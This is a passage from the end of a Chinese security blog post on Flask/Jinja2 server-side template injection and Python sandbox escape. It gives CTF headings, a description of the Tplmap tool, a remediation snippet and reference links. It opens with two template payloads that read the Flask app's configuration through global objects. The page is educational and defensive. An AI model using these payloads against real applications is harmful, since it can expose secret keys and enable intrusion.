&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;
&#123;&#123;get_flashed_messages.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;</code></pre></div>

<p>本质都是通过全局变量获取，直接使用ssti也可以</p>
<h2 id="2020-XCTF高校网络安全专题挑战赛-MINE1-1（Jinja2-SSTI）"><a href="#2020-XCTF高校网络安全专题挑战赛-MINE1-1（Jinja2-SSTI）" class="headerlink" title="2020 XCTF高校网络安全专题挑战赛 MINE1_1（Jinja2 SSTI）"></a>2020 XCTF高校网络安全专题挑战赛 MINE1_1（Jinja2 SSTI）</h2><h2 id="2020-XCTF高校网络安全专题挑战赛-MINE2（Jinja2-SSTI）"><a href="#2020-XCTF高校网络安全专题挑战赛-MINE2（Jinja2-SSTI）" class="headerlink" title="2020 XCTF高校网络安全专题挑战赛 MINE2（Jinja2 SSTI）"></a>2020 XCTF高校网络安全专题挑战赛 MINE2（Jinja2 SSTI）</h2><h1 id="Tplmap-工具"><a href="#Tplmap-工具" class="headerlink" title="Tplmap 工具"></a>Tplmap 工具</h1><p>Tplmap简介</p>
<p>Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。</p>
<div class="hljs code-wrapper"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/epinna/tplmap</code></pre></div>





<h1 id="flask-SSTI-修复"><a href="#flask-SSTI-修复" class="headerlink" title="flask SSTI 修复"></a>flask SSTI 修复</h1><p>简单修复：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request
<span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template

app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/safe&quot;</span></span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>
    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)

    t = Template(<span class="hljs-string">&quot;Hello,&#123;&#123;n&#125;&#125; &quot;</span>)
    <span class="hljs-keyword">return</span> t.render(n=name)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    app.run()</code></pre></div>









<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="SSTI/%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E8%AF%A6%E7%BB%86%E6%80%BB%E7%BB%93">SSTI/沙盒逃逸详细总结</a></li>
<li><a target="_blank" rel="noopener" href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#file">Python 沙箱逃逸</a></li>
<li><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E9%81%8D%E5%8E%86%E5%85%B6%E4%BB%96%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95">Python沙箱逃逸小结</a></li>
<li><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/#0x04-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">浅析Python Flask SSTI</a></li>
<li>[Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸](Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸)</li>
<li><a target="_blank" rel="noopener" href="https://www.christa.top/details/7/">基于flask SSTI沙箱逃逸研究</a></li>
<li><a target="_blank" rel="noopener" href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses</a></li>
<li><a target="_blank" rel="noopener" href="https://0day.work/bsidessf-ctf-2017-web-writeups/#zumbo3">BsidesSF CTF 2017 web writeups</a></li>
<li><a target="_blank" rel="noopener" href="https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2/">Jinja2 SSTI Research</a></li>
<li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4395911/blog/3305216">fake google</a></li>
<li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4357035/blog/3313766">WesternCTF2018 shrine</a></li>
<li><a target="_blank" rel="noopener" href="https://whoamianony.top/2020/12/27/ctf-bi-sai-ji-lu/xctf-gao-xiao-wang-luo-an-quan-zhuan-ti-tiao-zhan-sai-writeup/#toc-heading-1">2020 XCTF高校网络安全专题挑战赛（Web部分）</a></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/categories/python/">python</a>
                    
                      <a class="hover-with-bg" href="/categories/python/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">python沙箱逃逸</a>
                    
                      <a class="hover-with-bg" href="/categories/python/flask-SSTI/">flask SSTI</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/">巅峰极客2020</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/ssti1/">ssti1</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/buuctf/">buuctf</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/buuctf/fake-google/">fake google</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/WesternCTF2018/">WesternCTF2018</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/WesternCTF2018/shrine/">shrine</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/XCTF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98%E6%8C%91%E6%88%98%E8%B5%9B/">XCTF高校网络安全专题挑战赛</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/XCTF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98%E6%8C%91%E6%88%98%E8%B5%9B/MINE1-1/">MINE1_1</a>
                    
                      <a class="hover-with-bg" href="/categories/ctf/XCTF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98%E6%8C%91%E6%88%98%E8%B5%9B/MINE2/">MINE2</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">python沙箱逃逸</a>
                    
                      <a class="hover-with-bg" href="/tags/flask-SSTI/">flask SSTI</a>
                    
                      <a class="hover-with-bg" href="/tags/tplmap/">tplmap</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/10/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound-%E9%A2%84%E7%BD%AE%E5%8A%9F%E8%83%BD%E5%AD%A6%E4%B9%A0%E4%B8%8E%E8%AE%B0%E5%BD%95/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">域渗透分析工具 BloodHound-预置功能学习与记录</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/09/27/php%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%BC%80%E5%8F%91%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84php%E6%A1%86%E6%9E%B6/">
                        <span class="hidden-mobile">php从零开始开发属于自己的php框架</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function() {
        this.page.url = 'https://greydr34d.github.io/2020/10/05/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8-flask-SSTI/';
        this.page.identifier = '/2020/10/05/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8-flask-SSTI/';
      };
      Fluid.utils.waitElementVisible('disqus_thread', function () {
        var d = document, s = d.createElement('script');
        s.src = '//' + '' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', new Date());
        (d.head || d.body).appendChild(s);
      });
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener noopener">comments powered by Disqus.</a>
    </noscript>
  </div>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->




  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



</body>
</html>
